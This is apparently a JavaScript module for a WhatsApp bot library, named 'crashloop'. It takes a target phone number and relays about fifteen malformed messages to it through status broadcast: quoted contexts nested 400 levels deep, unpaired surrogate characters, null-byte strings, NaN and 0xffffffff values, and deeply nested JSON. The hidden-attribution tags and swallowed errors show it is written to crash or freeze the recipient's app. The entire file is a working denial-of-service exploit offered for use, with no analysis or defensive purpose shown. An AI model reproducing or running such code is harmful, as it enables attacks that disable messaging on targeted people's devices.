const crypto = require("crypto");

module.exports = async function crashloop(sock, target) {
    const jid = target.includes("@") ? target : `${target}@s.whatsapp.net`;

    const nestedContext = (depth) => {
        let inner = { remoteJid: "\0", stanzaId: crypto.randomBytes(8).toString("hex") };
        for (let i = 0; i < depth; i++) {
            inner = {
                remoteJid: "\0",
                stanzaId: crypto.randomBytes(8).toString("hex"),
                participant: "\0",
                mentionedJid: [`${"0".repeat(64)}@s.whatsapp.net`],
                conversionSource: "\0",
                conversionData: Buffer.alloc(128, 0).toString("base64"),
                quotedMessage: {
                    extendedTextMessage: { text: "\0", contextInfo: inner }
                }
            };
        }
        return inner;
    };

    const badJson = (() => {
        let o = { a: "\uD800" };
        for (let i = 0; i < 500; i++) o = { n: o, k: "\0", v: "\uDFFF" };
        return JSON.stringify(o);
    })();

    const payloads = [];

    payloads.push({
        interactiveMessage: {
            header: { title: "\0", hasMediaAttachment: true, locationMessage: { degreesLatitude: NaN, degreesLongitude: NaN, name: "\0".repeat(2048), url: "data:".repeat(1024) } },
            body: { text: "\0", contextInfo: nestedContext(400) },
            footer: { text: "\uD800\uDFFF".repeat(1024) },
            nativeFlowMessage: {
                buttons: [
                    { name: "\0", buttonParamsJson: badJson },
                    { name: "galaxy_message", buttonParamsJson: badJson },
                    { name: "call_permission_request", buttonParamsJson: "\0".repeat(0x2000) },
                    { name: "single_select", buttonParamsJson: badJson }
                ],
                messageParamsJson: badJson,
                messageVersion: 0xffff
            },
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        buttonsMessage: {
            contentText: "\0",
            footerText: "\0".repeat(4096),
            buttons: [
                { buttonId: "\0", buttonText: { displayText: "\0" }, type: 1, nativeFlowInfo: { name: "\0", paramsJson: badJson } },
                { buttonId: "\0".repeat(256), buttonText: { displayText: "\uD800".repeat(512) }, type: 2, nativeFlowInfo: { name: "galaxy_message", paramsJson: badJson } }
            ],
            headerType: 6,
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        productMessage: {
            product: {
                productImage: { url: "https://mmg.whatsapp.net/" + "\0".repeat(1024), mimetype: "image/jpeg", fileSha256: Buffer.alloc(32, 0xff).toString("base64"), fileLength: "999999999999999", height: 0xffffffff, width: 0xffffffff },
                productId: "\0".repeat(128),
                title: "\0",
                description: "\uD800".repeat(2048),
                currencyCode: "\0\0\0",
                priceAmount1000: "9999999999999999999",
                retailerId: "\0",
                url: "javascript:" + "\0".repeat(1024),
                productImageCount: 0xffffffff
            },
            businessOwnerJid: `${"0".repeat(64)}@s.whatsapp.net`,
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        listMessage: {
            title: "\0".repeat(2048),
            description: "\0",
            buttonText: "\uD800".repeat(512),
            listType: 0xffffffff,
            sections: Array.from({ length: 100 }, () => ({
                title: "\0",
                rows: Array.from({ length: 100 }, () => ({ title: "\0", description: "\uDFFF".repeat(64), rowId: "\0" }))
            })),
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        templateMessage: {
            hydratedTemplate: {
                hydratedContentText: "\0",
                hydratedFooterText: "\uD800".repeat(512),
                hydratedButtons: Array.from({ length: 200 }, () => ({
                    urlButton: { displayText: "\0", url: "data:".repeat(512) },
                    quickReplyButton: { displayText: "\uDFFF".repeat(256), id: "\0" }
                })),
                hydratedTitleText: "\0".repeat(2048)
            },
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        highlyStructuredMessage: {
            namespace: "\0".repeat(512),
            elementName: "\0",
            params: Array.from({ length: 1000 }, () => "\0"),
            localizableParams: Array.from({ length: 500 }, () => ({ title: "\0", defaultText: "\uD800".repeat(128) })),
            hydratedHsm: {
                hydratedContentText: "\0",
                hydratedFooterText: "\0".repeat(2048),
                hydratedButtons: Array.from({ length: 200 }, () => ({ quickReplyButton: { displayText: "\0", id: "\0" } }))
            }
        }
    });

    payloads.push({
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    header: { title: "\0", hasMediaAttachment: true, locationMessage: { degreesLatitude: NaN, degreesLongitude: NaN, url: "data:".repeat(1024) } },
                    nativeFlowMessage: { buttons: Array.from({ length: 30 }, () => ({ name: "galaxy_message", buttonParamsJson: badJson })) },
                    contextInfo: nestedContext(400)
                }
            }
        }
    });

    payloads.push({
        albumMessage: { expectedImageCount: 0xffffffff, expectedVideoCount: 0xffffffff, contextInfo: nestedContext(400) }
    });

    payloads.push({
        ptvMessage: {
            url: "https://mmg.whatsapp.net/" + "\0".repeat(1024),
            mimetype: "video/mp4",
            fileSha256: Buffer.alloc(32, 0xff).toString("base64"),
            fileLength: "9999999999999",
            height: 0xffffffff,
            width: 0xffffffff,
            seconds: 0xffffffff,
            mediaKey: Buffer.alloc(32, 0xff).toString("base64"),
            directPath: "\0".repeat(1024)
        }
    });

    payloads.push({
        pollCreationMessage: {
            name: "\0".repeat(2048),
            options: Array.from({ length: 100 }, () => ({ optionName: "\uD800".repeat(256) })),
            selectableOptionsCount: 0xffffffff,
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        eventMessage: {
            name: "\0".repeat(2048),
            description: "\uD800".repeat(512),
            startTime: "9999999999999",
            endTime: "9999999999999999",
            isCanceled: true,
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        commentMessage: {
            message: { conversation: "\0" },
            targetMessageKey: { remoteJid: jid, fromMe: false, id: "\0".repeat(256) },
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        newsletterAdminInviteMessage: {
            newsletterJid: `${"0".repeat(64)}@newsletter`,
            newsletterName: "\0".repeat(1024),
            caption: "\uD800".repeat(512),
            inviteExpiration: "9999999999999"
        }
    });

    payloads.push({ requestPhoneNumberMessage: { contextInfo: nestedContext(400) } });

    payloads.push({
        messageHistoryBundle: {
            mimetype: "application/x-protobuf",
            fileSha256: Buffer.alloc(32, 0xff).toString("base64"),
            mediaKey: Buffer.alloc(32, 0xff).toString("base64"),
            directPath: "\0".repeat(1024),
            fileEncSha256: Buffer.alloc(32, 0xff).toString("base64")
        }
    });

    const baseId = crypto.randomBytes(16).toString("hex").toUpperCase();

    for (let i = 0; i < payloads.length; i++) {
        const payload = payloads[i];
        const msgId = `${baseId}${i.toString(16).padStart(2, "0")}`;

        try {
            await sock.relayMessage("status@broadcast", payload, {
                messageId: msgId,
                statusJidList: [jid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { appdata: "default", platform: "ios" },
                        content: [
                            { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid } }] },
                            { tag: "status_attribution", attrs: { hidden: "true" }, content: [] },
                            { tag: "platform", attrs: { type: "ios", version: "2.24.0" }, content: [] }
                        ]
                    }
                ]
            });
            await new Promise(r => setTimeout(r, 150));
        } catch {}
    }
};
